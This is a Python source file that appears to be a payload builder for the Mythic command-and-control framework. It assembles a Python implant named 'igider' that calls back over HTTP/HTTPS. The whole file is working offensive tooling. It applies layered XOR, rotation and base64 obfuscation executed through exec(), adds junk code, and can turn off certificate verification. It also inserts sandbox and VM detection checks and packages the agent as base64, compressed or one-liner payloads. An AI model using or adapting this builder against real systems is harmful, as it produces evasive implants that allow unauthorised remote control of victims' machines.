from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import asyncio
import pathlib
import os
import tempfile
import base64
import hashlib
import json
import random
import string
import logging
from typing import Dict, Any, List, Optional
from itertools import cycle
import datetime

class Igider(PayloadType):
    name = "igider"
    file_extension = "py"
    author = "@med"
    supported_os = [
        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
    ]
    wrapper = False
    wrapped_payloads = ["pickle_wrapper"]
    mythic_encrypts = True
    note = "Production-ready Python agent with advanced obfuscation and encryption features"
    supports_dynamic_loading = True
    
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose output format",
            choices=["py", "base64", "py_compressed", "one_liner"],
            default_value="py"
        ),
        BuildParameter(
            name="cryptography_method",
            parameter_type=BuildParameterType.ChooseOne,
            description="Select crypto implementation method",
            choices=["manual", "cryptography_lib", "pycryptodome"],
            default_value="manual"
        ),
        BuildParameter(
            name="obfuscation_level",
            parameter_type=BuildParameterType.ChooseOne,
            description="Level of code obfuscation to apply",
            choices=["none", "basic", "advanced"],
            default_value="basic"
        ),
        BuildParameter(
            name="https_check",
            parameter_type=BuildParameterType.ChooseOne,
            description="Verify HTTPS certificate (if HTTP, leave yes)",
            choices=["Yes", "No"],
            default_value="Yes"
        )
    ]
    
    c2_profiles = ["http", "https"]
    
    # Use relative paths that can be configured
    _BASE_DIR = pathlib.Path(".")
    
    @property
    def agent_path(self) -> pathlib.Path:
        return self._BASE_DIR / "igider" / "mythic"
    
    @property
    def agent_icon_path(self) -> pathlib.Path:
        return self.agent_path / "icon.svg"
    
    @property
    def agent_code_path(self) -> pathlib.Path:
        return self._BASE_DIR / "igider" / "agent_code"
    
    build_steps = [
        BuildStep(step_name="Initializing Build", step_description="Setting up the build environment"),
        BuildStep(step_name="Gathering Components", step_description="Collecting agent code modules"),
        BuildStep(step_name="Configuring Agent", step_description="Applying configuration parameters"),
        BuildStep(step_name="Applying Obfuscation", step_description="Implementing obfuscation techniques"),
        BuildStep(step_name="Finalizing Payload", step_description="Preparing final output format")
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.logger = self._setup_logger()
        
    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger("igider_builder")
        logger.setLevel(logging.DEBUG)
        return logger

    def get_file_path(self, directory: pathlib.Path, file: str) -> str:
        """Get the full path to a file, verifying its existence."""
        filename = os.path.join(directory, f"{file}.py")
        return filename if os.path.exists(filename) else ""
    
    async def update_build_step(self, step_name: str, message: str, success: bool = True) -> None:
        """Helper to update build step status in Mythic UI."""
        try:
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName=step_name,
                StepStdout=message,
                StepSuccess=success
            ))
        except Exception as e:
            self.logger.error(f"Failed to update build step: {e}")

    def _load_module_content(self, module_path: str) -> str:
        """Safely load content from a module file."""
        try:
            with open(module_path, "r") as f:
                return f.read()
        except Exception as e:
            self.logger.error(f"Error loading module {module_path}: {e}")
            return ""

    def _apply_config_replacements(self, code: str, replacements: Dict[str, Any]) -> str:
        """Apply configuration replacements to code."""
        for key, value in replacements.items():
            if isinstance(value, (dict, list)):
                # Convert Python objects to JSON, then fix boolean/null values for Python syntax
                json_val = json.dumps(value).replace("false", "False").replace("true", "True").replace("null", "None")
                code = code.replace(key, json_val)
            elif value is not None:
                code = code.replace(key, str(value))
        return code

    def _generate_random_identifier(self, length: int = 8) -> str:
        """Generate a random string for variable names to enhance obfuscation."""
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

    def _basic_obfuscate(self, code: str) -> str:
        """Apply basic XOR + Base64 obfuscation."""
        key = hashlib.md5(os.urandom(128)).hexdigest().encode()
        encrypted_content = ''.join(chr(c^k) for c,k in zip(code.encode(), cycle(key))).encode()
        b64_enc_content = base64.b64encode(encrypted_content)
        xor_func = "chr(c^k)"
        
        # Use random variable names
        var_b64 = self._generate_random_identifier()
        var_key = self._generate_random_identifier()
        var_iter = self._generate_random_identifier()
        
        return f"""import base64, itertools
{var_b64} = {b64_enc_content}
{var_key} = {key}
{var_iter} = itertools.cycle({var_key})
exec(''.join({xor_func} for c,k in zip(base64.b64decode({var_b64}), {var_iter})).encode())
"""

    def _advanced_obfuscate(self, code: str) -> str:
        """Apply more advanced obfuscation with multi-layer encryption and junk code."""
        # First layer: XOR with a random key
        key1 = hashlib.md5(os.urandom(64)).hexdigest().encode()
        layer1 = ''.join(chr(c^k) for c,k in zip(code.encode(), cycle(key1)))
        
        # Second layer: Rotate bytes by a random amount
        rotation = random.randint(1, 255)
        layer2 = ''.join(chr((ord(c) + rotation) % 256) for c in layer1)
        
        # Third layer: Base64 encode
        encoded = base64.b64encode(layer2.encode())
        
        # Generate random variable names
        var_data = self._generate_random_identifier()
        var_key = self._generate_random_identifier()
        var_rot = self._generate_random_identifier()
        var_result = self._generate_random_identifier()
        var_char = self._generate_random_identifier()
        var_k = self._generate_random_identifier()
        var_c = self._generate_random_identifier()
        
        # Add some junk functions that never get called
        junk1_name = self._generate_random_identifier()
        junk2_name = self._generate_random_identifier()
        
        # Build decoder with randomized variable names
        decoder = f"""
import base64, itertools, sys, random

def {junk1_name}():
    return [random.randint(1, 100) for _ in range(10)]

{var_data} = {encoded}
{var_key} = {key1}
{var_rot} = {rotation}

def {junk2_name}(x):
    return ''.join(chr((ord(c) + 13) % 256) for c in x)

{var_result} = ''
for {var_c}, {var_k} in zip(
    ''.join(chr((ord({var_char}) - {var_rot}) % 256) for {var_char} in base64.b64decode({var_data}).decode()),
    itertools.cycle({var_key})
):
    {var_result} += chr(ord({var_c}) ^ {var_k})

exec({var_result})
"""
        return decoder

    def _compress_code(self, code: str) -> str:
        """Compress the code using zlib for smaller payloads."""
        import zlib
        compressed = zlib.compress(code.encode(), level=9)
        compressed_b64 = base64.b64encode(compressed)
        
        return f"""import base64, zlib
exec(zlib.decompress(base64.b64decode({compressed_b64})))
"""

    def _create_one_liner(self, code: str) -> str:
        """Convert the payload to a one-liner for command line execution."""
        # Remove comments and unnecessary whitespace
        import re
        
        # Remove comments
        code = re.sub(r'#.*$', '', code, flags=re.MULTILINE)
        
        # Remove docstrings
        code = re.sub(r'""".*?"""', '', code, flags=re.DOTALL)
        code = re.sub(r"'''.*?'''", '', code, flags=re.DOTALL)
        
        # Replace newlines in the code with semicolons
        code = ';'.join(line.strip() for line in code.split('\n') if line.strip())
        
        return code

    def _add_evasion_features(self, code: str) -> str:
        """Add anti-analysis and VM detection capabilities with robust error handling."""
        evasion_code = []
         # 1. Add kill date check if specified
        try:
            kill_date = self.c2info[0].get_parameters_dict().get("killdate", "").strip()
            if kill_date:
                try:
                    # Validate date format
                    datetime.datetime.strptime(kill_date, "%Y-%m-%d")
                    evasion_code.append(f"""
import datetime
if datetime.datetime.now() > datetime.datetime.strptime("{kill_date}", "%Y-%m-%d"):
    import sys
    sys.exit(0)
""")
                except ValueError as e:
                    self.logger.warning(f"Invalid killdate format (should be YYYY-MM-DD): {e}")
        except (IndexError, AttributeError, TypeError) as e:
            self.logger.debug(f"Could not retrieve kill_date: {e}")

    # 2. Add platform-agnostic evasion checks
        evasion_code.append("""
def check_environment():
    import os
    import sys
    import socket
    import platform
    import subprocess
    
    # Generic suspicious indicators
    suspicious_indicators = {
        'hostnames': ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual'],
        'users': ['user', 'sandbox', 'vmuser'],
        'processes': ['vmtoolsd', 'vmwaretray', 'vboxservice']
    }
    
    # Check hostname
    try:
        hostname = socket.gethostname().lower()
        if any(name in hostname for name in suspicious_indicators['hostnames']):
            return False
    except:
        pass
    
    # Check username
    try:
        username = os.getenv("USER", "").lower()
        if any(user in username for user in suspicious_indicators['users']):
            return False
    except:
        pass
    
    # Platform-specific checks
    try:
        if platform.system().lower() == 'windows':
            import ctypes
            # Check disk size (Windows)
            try:
                free_bytes = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                    ctypes.c_wchar_p(r"C:\\"), 
                    None, 
                    None, 
                    ctypes.pointer(free_bytes)
                )
                if free_bytes.value < 21474836480:  # 20 GB
                    return False
            except:
                pass
            
            # Check for common VM processes (Windows)
            try:
                import wmi
                c = wmi.WMI()
                for process in c.Win32_Process():
                    if process.Name.lower() in suspicious_indicators['processes']:
                        return False
            except:
                pass
                
        else:  # Linux/Mac
            import shutil
            # Check disk size
            try:
                if shutil.disk_usage("/").free < 21474836480:  # 20 GB
                    return False
            except:
                pass
            
            # Check for VM-specific processes (Linux/Mac)
            try:
                ps = subprocess.Popen(['ps', '-aux'], stdout=subprocess.PIPE)
                output = subprocess.check_output(['grep', '-i'] + suspicious_indicators['processes'], stdin=ps.stdout)
                if output:
                    return False
            except:
                pass
                
    except Exception as e:
        # If any checks fail, assume we're in a good environment
        pass
    
    return True

# Execute evasion checks
# if not check_environment():
#     import sys
#     sys.exit(0)
""")
    
    # Combine all evasion code and prepend to the original code
        return "\n".join(evasion_code) + "\n" + code
#         """Add anti-analysis and VM detection capabilities."""
#         # Add kill date check if specified*******************************************
#         try:
#             kill_date = self.c2info[0].get_parameters_dict().get("killdate", None)

#         except (IndexError, AttributeError, TypeError) as e:
#             kill_date = None
#             self.logger.warning(f"Could not retrieve kill_date: {e}")

#         evasion_code = ""
        
#         if kill_date and kill_date.strip():
#             evasion_code += f"""
# import datetime
# if datetime.datetime.now() > datetime.datetime.strptime("{kill_date}", "%Y-%m-%d"):
#     import sys
#     sys.exit(0)
# """
        
#         # Add basic sandbox/VM detection
#         evasion_code += """
# def check_environment():
#     import os
#     import socket
#     import platform
    
#     # Check for common analysis hostnames
#     hostname = socket.gethostname().lower()
#     suspicious_names = ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual']
#     for name in suspicious_names:
#         if name in hostname:
#             return False
    
#     # Check for small disk size (common in VMs)
#     try:
#         if os.name == 'nt':
#             import ctypes
#             free_bytes = ctypes.c_ulonglong(0)
#             ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p("C:\\"), None, None, ctypes.pointer(free_bytes))
#             if free_bytes.value < 21474836480:  # 20 GB
#                 return False
#         else:
#             import shutil
#             if shutil.disk_usage("/").free < 21474836480:  # 20 GB
#                 return False
#     except:
#         pass
    
#     return True

# # Exit if suspicious environment detected
# if not check_environment():
#     import sys
#     sys.exit(0)
# """
        
#         # Add the evasion code at the beginning of the agent code
#         return evasion_code + code

    async def build(self) -> BuildResponse:
        """Build the Igider payload with the specified configuration."""
        resp = BuildResponse(status=BuildStatus.Success)
        build_errors = []
        
        try:
            # Step 1: Initialize build
            await self.update_build_step("Initializing Build", "Starting build process...")
            
            # Step 2: Gather components
            await self.update_build_step("Gathering Components", "Loading agent modules...")
            
            # Load base agent code
            base_agent_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "base_agent")
            if not base_agent_path:
                build_errors.append("Base agent code not found")
                await self.update_build_step("Gathering Components", "Base agent code not found", False)
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = "\n".join(build_errors)
                return resp
                
            base_code = self._load_module_content(base_agent_path)
            
            # Load appropriate crypto module
            crypto_method = self.get_parameter("cryptography_method")
            if crypto_method == "cryptography_lib":
                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "crypto_lib")
            elif crypto_method == "pycryptodome":
                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "pycrypto_lib")
            else:  # default to manual
                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "manual_crypto")
                
            if not crypto_path:
                build_errors.append(f"Crypto module '{crypto_method}' not found")
                crypto_code = "# Error loading crypto module"
            else:
                crypto_code = self._load_module_content(crypto_path)
            
            # Load command modules
            command_code = ""
            for cmd in self.commands.get_commands():
                command_path = self.get_file_path(self.agent_code_path, cmd)
                if not command_path:
                    build_errors.append(f"Command module '{cmd}' not found")
                else:
                    command_code += self._load_module_content(command_path) + "\n"
            
            # Step 3: Configure agent
            await self.update_build_step("Configuring Agent", "Applying agent configuration...")
            
            # Replace placeholders with actual code/config
            base_code = base_code.replace("CRYPTO_MODULE_PLACEHOLDER", crypto_code)
            base_code = base_code.replace("UUID_HERE", self.uuid)
            base_code = base_code.replace("#COMMANDS_PLACEHOLDER", command_code)
            
            
            # Process C2 profile configuration
            for c2 in self.c2info:
                profile = c2.get_c2profile()["name"]
                base_code = self._apply_config_replacements(base_code, c2.get_parameters_dict())
            
            # Configure HTTPS certificate validation
            if self.get_parameter("https_check") == "No":
                base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
                base_code = base_code.replace("#CERTSKIP", 
                """
        gcontext = ssl.create_default_context()
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE\n""")
            else:
                base_code = base_code.replace("#CERTSKIP", "")
            
            # Step 4: Apply obfuscation
            await self.update_build_step("Applying Obfuscation", "Implementing code obfuscation...")
            
            # Add evasion features first
            base_code = self._add_evasion_features(base_code)
            
            # Apply obfuscation based on selected level
            obfuscation_level = self.get_parameter("obfuscation_level")
            if obfuscation_level == "advanced":
                base_code = self._advanced_obfuscate(base_code)
                await self.update_build_step("Applying Obfuscation", "Advanced obfuscation applied successfully")
            elif obfuscation_level == "basic":
                base_code = self._basic_obfuscate(base_code)
                await self.update_build_step("Applying Obfuscation", "Basic obfuscation applied successfully")
            else:  # none
                await self.update_build_step("Applying Obfuscation", "No obfuscation requested, skipping")
            
            # Step 5: Finalize payload format
            await self.update_build_step("Finalizing Payload", "Preparing output in requested format...")
            
            output_format = self.get_parameter("output")
            if output_format == "base64":
                resp.payload = base64.b64encode(base_code.encode())
                resp.build_message = "Successfully built payload in base64 format"
            elif output_format == "py_compressed":
                compressed_code = self._compress_code(base_code)
                resp.payload = compressed_code.encode()
                resp.build_message = "Successfully built compressed Python payload"
            elif output_format == "one_liner":
                one_liner = self._create_one_liner(base_code)
                resp.payload = one_liner.encode()
                resp.build_message = "Successfully built one-liner payload"
            else:  # default to py
                resp.payload = base_code.encode()
                resp.build_message = "Successfully built Python script payload"
            
            # Report any non-fatal errors
            if build_errors:
                resp.build_stderr = "Warnings during build:\n" + "\n".join(build_errors)
            
        except Exception as e:
            self.logger.error(f"Build failed: {str(e)}")
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = f"Error building payload: {str(e)}"
            await self.update_build_step("Finalizing Payload", f"Build failed: {str(e)}", False)
            
        return resp